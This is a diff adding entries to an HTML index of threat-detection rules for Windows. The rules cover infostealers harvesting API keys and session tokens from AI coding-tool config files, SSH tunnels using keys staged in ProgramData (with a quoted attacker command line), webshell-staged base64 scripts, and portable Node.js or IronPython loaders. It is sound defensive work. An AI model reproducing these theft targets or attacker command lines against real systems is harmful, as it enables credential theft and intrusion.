+        <span class="rr-lvl"><span class="lvl lvl-medium">Medium</span></span>
+        <span class="rr-date">2026-10-24</span>
+      </a>
       <a class="rule-row" href="rules/file_access_win_ai_coding_assistant_config_files_accessed_by_uncommon_process.html" data-level="medium" data-product="windows"
          data-search="ai coding assistant config files accessed by uncommon process t1552.001 file_access detects a process other than the owning application accessing the claude, cursor or windsurf configuration/auth files under %appdata%. elastic security labs reports that the windows infostealer delivered through the malicious @apexacc npm packages collects ai coding-tool / mcp configuration files, including %appdata%\claude\config.json, %appdata%\cursor\user\storage.json and %appdata%\windsurf\auth.json, which can hold api keys and session tokens. owner applications are filtered by their default per-user install paths; processes under program files, system32/syswow64, the system process and microsoft defender are excluded.">
         <span class="rr-main">
@@ -628,6 +768,16 @@
         <span class="rr-tech"><span class="chip">T1552.001</span></span>
         <span class="rr-lvl"><span class="lvl lvl-medium">Medium</span></span>
         <span class="rr-date">2026-10-19</span>
+      </a>
+      <a class="rule-row" href="rules/file_event_win_aokigahara_kmd_w_staging_db_created.html" data-level="medium" data-product="windows"
+         data-search="aokigahara infostealer kmd_w_ staging database file created t1074.001 file_event detects creation of a file named kmd_w_&lt;number&gt;_&lt;number&gt;.db. check point&#x27;s yara rule for the aokigahara infostealer contains the format string $str10 = &quot;%s\\kmd_w_%d_%d.db&quot;, a .db file written into a folder that the report does not name. the rule matches the verbatim file-name pattern with %d as decimal digits and ignores the folder. the report does not describe the file&#x27;s purpose; a staging copy of a locked sqlite store is an analyst inference.">
+        <span class="rr-main">
+          <span class="rr-title">Aokigahara Infostealer Kmd_w_ Staging Database File Created</span>
+          <span class="rr-sub">Windows · file event</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1074.001</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-medium">Medium</span></span>
+        <span class="rr-date">2026-10-24</span>
       </a>
       <a class="rule-row" href="rules/file_event_win_base64_encoded_script_staged_in_windows_temp.html" data-level="medium" data-product="windows"
          data-search="base64 encoded script staged in windows temp t1140 t1027.013 file_event detects creation of a .ps1.b64 or .js.b64 file (a base64-encoded powershell or javascript file) in c:\windows\temp\. through aspx webshells, the attacker staged base64-encoded planter scripts in c:\windows\temp (plant_ccrtc_mousewheel.ps1.b64, plant_ccrtc_fast.ps1.ps1.b64, ccrtc_sdk_init.js.b64) and decoded them next to the originals (.ps1 / .js) before using them to trojanize a jquery file on the site&#x27;s login page.">
@@ -739,6 +889,16 @@
         <span class="rr-lvl"><span class="lvl lvl-medium">Medium</span></span>
         <span class="rr-date">2026-10-21</span>
       </a>
+      <a class="rule-row" href="rules/proc_creation_win_openssh_client_identity_key_from_programdata.html" data-level="medium" data-product="windows"
+         data-search="openssh client using identity key stored in programdata t1572 process_creation detects the windows openssh client ssh.exe started with an identity (private key) file under c:\programdata\. symantec reports that swallowtail &quot;opened a persistent ssh tunnel from their own server into the shipbuilder&#x27;s internal network&quot; with the built-in client, using the command line &quot;c:\windows\system32\openssh\ssh.exe -i c:\programdata\adobe\id_rsa -o identitiesonly=yes&quot;. user ssh keys normally live in the user&#x27;s .ssh folder; a private key staged in a vendor-named programdata folder is a sign of an implanted tunnel. the forwarding arguments are not quoted in the report, so the rule does not depend on -r/-l (sigmahq already covers ssh.exe -r port forwarding). the rule matches the unquoted path form; a quoted key path (&quot;c:\programdata\...&quot;) will not match.">
+        <span class="rr-main">
+          <span class="rr-title">OpenSSH Client Using Identity Key Stored In ProgramData</span>
+          <span class="rr-sub">Windows · process creation</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1572</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-medium">Medium</span></span>
+        <span class="rr-date">2026-10-24</span>
+      </a>
       <a class="rule-row" href="rules/proc_creation_win_node_exe_from_programdata_running_script.html" data-level="medium" data-product="windows"
          data-search="portable node.exe executed from programdata running javascript file t1059.007 process_creation detects node.exe running from a folder under c:\programdata\ with a .js script on the command line. huntress reports an amazon-themed clickfix campaign in which the malware unpacks a portable node.js runtime &quot;to the location c:\programdata\nodeview, then runs the (non-malicious) node.exe interpreter, passing it the index.js file as an argument&quot;; the heavily obfuscated index.js then fetches the next stage that leads to lumma stealer. installed node.js lives under program files or a user profile; a portable runtime dropped into programdata is typical of malware staging.">
         <span class="rr-main">
@@ -818,6 +978,16 @@
         <span class="rr-tech"><span class="chip">T1041</span></span>
         <span class="rr-lvl"><span class="lvl lvl-low">Low</span></span>
         <span class="rr-date">2026-10-19</span>
+      </a>
+      <a class="rule-row" href="rules/file_access_win_claude_code_config_file_accessed_by_uncommon_process.html" data-level="low" data-product="windows"
+         data-search="claude code config file accessed by uncommon process t1552.001 file_access detects a process other than claude code accessing the claude code configuration file .claude.json in a user profile. symantec reports that aoki infostealer modules &quot;were designed to harvest credential and session files for claude, openai&#x27;s codex, cursor, codeium and gemini&quot;, and that the newest version &quot;targeted .claude.json, claude desktop cookies, chatgpt cookies, and the codex config.toml and .env files&quot;. claude code reads this file on every run, so the native installer binary under c:\users\&lt;user&gt;\.local\bin, the claude.exe bundled with the claude code ide extension, and the claude desktop app are filtered; processes under program files (including a machine-wide node.js install), system32/syswow64, the system process and microsoft defender are excluded. an optional filter excludes node.exe run from per-user node.js version managers (nvm-windows, nvm4w, volta, fnm) used to run an npm-installed claude code; removing it restores visibility of node.js-based stealers running from those locations at the cost of more noise. intended as a low-severity hunting rule; review hits for the accessing image and correlate with network activity.">
+        <span class="rr-main">
+          <span class="rr-title">Claude Code Config File Accessed By Uncommon Process</span>
+          <span class="rr-sub">Windows · file access</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1552.001</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-low">Low</span></span>
+        <span class="rr-date">2026-10-24</span>
       </a>
       <a class="rule-row" href="rules/proc_creation_win_ironpython_ipyw32_execution_or_curl_ironpython_download.html" data-level="low" data-product="windows"
          data-search="ironpython windowless interpreter executed or ironpython downloaded via curl t1059.006 t1105 process_creation detects execution of ipyw32.exe, the windowless interpreter shipped with the ironpython distribution, outside a program files install, or curl.exe downloading an ironpython distribution archive. huntress reports an amazon-themed clickfix campaign in which the finger.exe-delivered script &quot;spawns curl to download and unpack ironpython.3.4.2.zip&quot; and then passes &quot;a base64-encoded, zlib-compressed python script data blob directly to the ipyw32.exe program as a command flag&quot;; the python loader decrypts and injects the doina loader into memory. ironpython is rarely installed in enterprises, and its windowless interpreter running from an unpacked archive (rather than an installed copy) is worth reviewing as a possible fileless python loader. the program files filter is an assumption based on the ironpython msi&#x27;s default install location; the report does not give the unpack directory. the report does not name the command flag used to pass the script blob, so the ipyw32.exe branch matches on the interpreter name and location only and carries no command-line qualifier. treat it as a threat-hunting lead: review the commandline for a long base64 argument before escalating.">
